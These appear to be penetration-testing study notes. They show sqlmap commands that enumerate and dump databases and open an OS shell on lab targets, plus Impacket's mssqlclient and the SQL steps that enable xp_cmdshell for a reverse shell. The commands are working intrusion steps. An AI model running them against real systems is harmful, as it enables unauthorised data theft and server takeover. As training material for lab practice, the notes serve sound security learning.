## SQLmap
SQLmap is an open-source tool used in penetration testing to detect and exploit SQL  injection flaws. SQLmap automates the process of detecting and exploiting SQL  injection. SQL Injection attacks can take control of databases that utilize SQL.

If we needed authentication to access to the web we will need to add the cookies value to the command. For doing that we can use Cookie-Editor, explained in [[Useful webs]].

### EXAMPLE 1

We can use *sqlmap* specifying the target url:
- *Parameters*:
	- `-u`: Specifies the target URL to be tested for SQL injection vulnerabilities. In this case, the target URL is http://192.168.1.102/administrator
	    
	- `--batch`: This parameter is used to run sqlmap in batch mode, which means it will not prompt for any interactive user input and will perform the operations automatically.
	    
	- `--dbs`: This parameter instructs sqlmap to enumerate the available databases on the database server. By specifying this parameter, sqlmap will search for information about the databases it has access to by injecting SQL into the mentioned parameter.

	- `--tables`: This parameter instructs sqlmap to enumerate the available tables in the selected database. By using this parameter, sqlmap will search for information about the tables present in the database through the injection of SQL into the mentioned parameter.

	- `--level (1-5, default 1):`: This flag defines the scope of vectors and boundaries used for injection. Higher levels indicate a wider range of tests with a lower success rate (more obscure techniques).
		- Levels:
		    - 1 (default): Basic tests, minimal impact.
		    - 2: Extends tests to more techniques, might cause some disruption.			    
		    - 3: More advanced techniques, higher chance of impacting the target.
		    - 4-5: Highly specific and risky techniques, use with caution.

		- `--risk (1-3, default 1)`: This flag controls the types of exploit vectors used based on their potential risk. Higher risk means *sqlmap* attempts techniques that could potentially damage the database.
			- Levels:
			    - 1 (default): Low-risk techniques, unlikely to cause harm.
			    - 2: Includes techniques with a moderate risk of data loss or denial-of-service.
			    - 3: Attempts all techniques, including highly disruptive or data-altering ones (use responsibly).
		
	```bash
	sqlmap -u http://192.168.1.102/administrator --forms --dbs --batch
	```
	After using this command the available databases will be printed, then you can enumerate  the tables stored in each database:
	```bash
	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> --tables --batch
	```
	Once you have introduced this command, the available columns in the database will be printed. Now to find the content of the columns you need to use the following command:
	```bash
	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Columns_name> --columns --batch
	```
	Finally, you can print the columns information using:
	```bash
	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Columns_name> -C <parameter1>,<parameter2><parameter3> --dump --batch
	```

### EXAMPLE 2	
For a most exhaustive analysis, we can save the vulnerable request with _save item_ in Burp Suite. The field in which the insertion will be made in this example is **id**, previously investigated in Burp Suite.

- *Parameters:*
	- `-r pc`: This parameter specifies the file that contains the saved HTTP request, in this case called "pc". The file is used as input for sqlmap and contains the request that will be used to perform the SQL injection test.
	- `-p id`: This parameter indicates the name of the URL parameter or body parameter in the HTTP request that will be used as the SQL injection point. In this case, the parameter is named "id" and sqlmap will attempt to inject SQL into that parameter to search for possible vulnerabilities.
	- `--dbs`: This parameter instructs sqlmap to enumerate the available databases on the database server. By specifying this parameter, sqlmap will search for information about the databases it has access to by injecting SQL into the mentioned parameter.
	- `--tables`: This parameter instructs sqlmap to enumerate the available tables in the selected database. By using this parameter, sqlmap will search for information about the tables present in the database through the injection of SQL into the mentioned parameter.
	- `-D SQLite_masterdb`: This parameter specifies the name of the database on which the operations will be performed. In this case, "SQLite_masterdb" is used as the database name.
	- `-T accounts`: This parameter specifies the name of the table on which the operations will be performed. In this case, "accounts" is used as the table name.
	- `--columns`: This parameter instructs sqlmap to enumerate the available columns in the specified table.
	- `--batch`: This parameter is used to run sqlmap in batch mode, which means it will not prompt for any interactive user input and will perform the operations automatically.
	- `--threads 5`: This parameter specifies the number of threads that sqlmap will use simultaneously to perform the operations. In this case, 5 threads are used.
	- `--dump`: This parameter instructs sqlmap to extract the data from the specified table and display it as output.

*Commands: *
- Find databases:
```bash
sqlmap -r pc -p id  --dbs	
```
- Find tables in a specific database:	
```bash
sqlmap -r pc -p id -D <database_name> --tables  
```
- Find columns in a specific table:
```bash
sqlmap -r pc -p id -D <database_name> -T <table_name> --columns 
```
- Dump columns content
```bash
sqlmap -r pc -p id -D <database_name> -T <table_name> --dump --columns "<column1_name>,<column2_name>,<column3_name>"
```

### Exemple 3
- Parameters:
	- `-u`: Specifies the target URL to be tested for SQL injection vulnerabilities. In this case, the target URL is `http://10.129.95.174/dashboard.php?search=any+query`
	    
	- `--cookie`: Sets the cookie value for the HTTP request. Cookies are often used to maintain session information. Here, the cookie being set is `PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1`.
	    
	- `--os-shell`: This parameter instructs SQLMap to attempt to obtain an operating system shell on the vulnerable server if it successfully exploits a SQL injection vulnerability. An operating system shell allows direct interaction with the underlying operating system.
```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --  
cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
```
# mssqlclient.py 
mssqlclient.py is a script from the Impacket class collection. When mssqlclient.py is executed, a connection is established with the specified SQL Server and it allows interaction through a command-line interface.

- `windows-auth`: This flag is specified to use Windows Authentication.
- `ARCHETYPE/sql_svc`: Server ID (previously found).
````bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
````

In case `xp_cmdshell` is not enabled (which is the command we will use for a reverse shell), perform the following steps:
````bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; -- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

````